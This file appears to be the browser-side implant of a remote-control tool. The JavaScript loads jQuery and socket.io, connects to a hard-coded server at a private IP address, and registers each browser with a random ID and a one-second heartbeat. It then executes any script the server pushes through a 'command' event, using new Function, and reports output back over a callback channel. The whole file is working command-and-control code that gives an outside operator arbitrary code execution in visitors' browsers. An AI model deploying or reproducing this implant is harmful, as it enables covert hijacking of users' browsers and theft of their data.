var config = {"ip":"http://192.168.0.164", 'ioport': '3000', 'webport': '3030', "injectjquery": true}, dviide;
function injectScript(src, url, callback) {
  if(url) {
    var script = document.createElement("SCRIPT");
    script.src = src;
    script.type = 'text/javascript';
    script.onload = function() {
      var $ = window.jQuery;
      callback();
    };
    document.getElementsByTagName("head")[0].appendChild(script);
  } else {
    eval(src);
  }
}

function uuid() {
  return s4() + s4() + '-' + s4() + '-' + s4() + '-' +
  s4() + '-' + s4() + s4() + s4();
}

function s4() {
  return Math.floor((1 + Math.random()) * 0x10000)
  .toString(16)
  .substring(1);
}

(function() {
  if(config.injectjquery) {
    injectScript('https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js', true, function() {
      injectScript('https://cdnjs.cloudflare.com/ajax/libs/socket.io/2.0.2/socket.io.js', true, function() {
        afterInject();
      });
    });
  } else {
    injectScript('https://cdnjs.cloudflare.com/ajax/libs/socket.io/2.0.2/socket.io.js', true, function() {
      afterInject();
    });
  }
})();

function dviide() {
  var date = Date();
  this.socket = io(config.ip + ':' + config.ioport);
  this.id = uuid();
  this.ip = config.ip;
  this.ioport = config.ioport;
  this.webport = config.webport;
  this.socket.emit("conn", {id: this.id});
  this.socket.on("command", function(data) {
    var Module = new Function(data.script);
    var module = new Module();
    module.start();
  });
  this.disconnect = function() {
    clearInterval(this.heartbeatid);
    this.socket.close();
  }
  this.callbackText = function(data) {
    this.socket.emit("callback", {id: this.id, data: data + "\n"});
  }
  this.heartbeat = function() {
    if(dviide.socket.connected) {
      dviide.socket.emit("beat", {id: dviide.id});
    }
  }
  this.heartbeatid = setInterval(this.heartbeat, 1000);
}

function afterInject() {
  dviide = new dviide();
}
